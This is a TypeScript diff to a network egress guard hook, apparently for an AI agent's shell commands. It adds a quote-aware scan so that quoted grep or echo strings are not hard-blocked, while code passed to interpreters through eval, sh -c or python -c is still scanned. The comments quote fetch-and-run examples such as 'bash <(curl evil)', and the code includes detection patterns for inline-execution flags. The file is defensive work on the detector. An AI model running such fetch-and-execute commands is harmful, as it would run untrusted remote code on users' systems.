@@ -145,6 +145,73 @@ function firstRemoteHost(cmd: string): string | null {
 }
 
 // =============================================================================
+// Quote-aware view for the DENY tier (#3122)
+// =============================================================================
+
+/**
+ * True when the unquoted text just before a quote makes that quote EXECUTED
+ * code: `eval "…"`, an inline-script shell (`sh -c`, `bash -euc`), `python -c`,
+ * node/perl/ruby `-e`, php `-r`. A quote governed by none of these is opaque
+ * data (a grep/rg pattern, an echo string, a jq filter).
+ */
+function execGovernsQuote(prefix: string): boolean {
+  const p = prefix.slice(-200); // bound the governor scan (ReDoS-safe)
+  return (
+    /\beval\s*$/i.test(p) ||
+    /\b(?:ba|z|k|da)?sh\b[^\n]{0,120}\s-[A-Za-z]*c\b\s*$/i.test(p) ||
+    /\bpython[0-9.]*\b[^\n]{0,120}\s-c\b\s*$/i.test(p) ||
+    /\b(?:node|perl|ruby)\b[^\n]{0,120}\s-e\b\s*$/i.test(p) ||
+    /\bphp\b[^\n]{0,120}\s-r\b\s*$/i.test(p)
+  );
+}
+
+/**
+ * Build the text the DENY tier scans. A quoted string is opaque DATA to the
+ * shell — `grep "bash <(curl x)"` executes nothing — so scanning quoted content
+ * false-DENY-blocked search patterns and echo strings (#3122). We blank quoted
+ * regions, EXCEPT the quoted argument an interpreter executes (see
+ * execGovernsQuote): that content IS code and must stay scannable, or
+ * `bash -c "bash <(curl evil)"` would slip through.
+ *
+ * DENY tier only. The ASK tier keeps the raw normalized command because it must
+ * still see URLs (commonly quoted) for the host-allowlist checks.
+ */
+function egressDenyScanView(raw: string): string {
+  let out = '';
+  let seg = ''; // unquoted text of the current simple command (governor context)
+  for (let i = 0; i < raw.length; i++) {
+    const ch = raw[i];
+    if (ch === '"' || ch === "'") {
+      const q = ch;
+      let j = i + 1;
+      let content = '';
+      while (j < raw.length && raw[j] !== q) {
+        if (q === '"' && raw[j] === '\\' && j + 1 < raw.length) {
+          content += raw[j + 1];
+          j += 2;
+          continue;
+        }
+        content += raw[j];
+        j++;
+      }
+      if (execGovernsQuote(seg)) out += ` ${content} `; // re-expose executed code
+      seg = '';
+      i = j; // for-loop ++ moves past the closing quote
+      continue;
+    }
+    // A new simple-command / substitution boundary resets the governor context.
+    if (ch === ';' || ch === '\n' || ch === '&' || ch === '|' || ch === '(') {
+      seg = '';
+      out += ch;
+      continue;
+    }
+    seg += ch;
+    out += ch;
+  }
+  return out;
+}
+
+// =============================================================================
 // Main handler
 // =============================================================================
 
@@ -153,10 +220,14 @@ export function networkEgressGuard(input: HookInput, ctx: HookContext = NOOP_CTX
   if (!raw) return outputSilentSuccess();
 
   const command = normalizeSingle(raw);
+  // #3122: the DENY tier scans a quote-aware view so a quoted mention of an RCE
+  // pattern (a grep/rg search string, an echo) is not hard-blocked. The ASK tier
+  // keeps `command` — it must still see quoted URLs for the host-allowlist checks.
+  const denyScan = normalizeSingle(egressDenyScanView(raw));
 
   // --- DENY tier ---
   for (const { re, label } of DENY_REGEX) {
-    if (re.test(command)) {
+    if (re.test(denyScan)) {
       ctx.log(HOOK_NAME, `BLOCKED: ${label}`);
       ctx.logPermission('deny', label, input);
       return outputDeny(
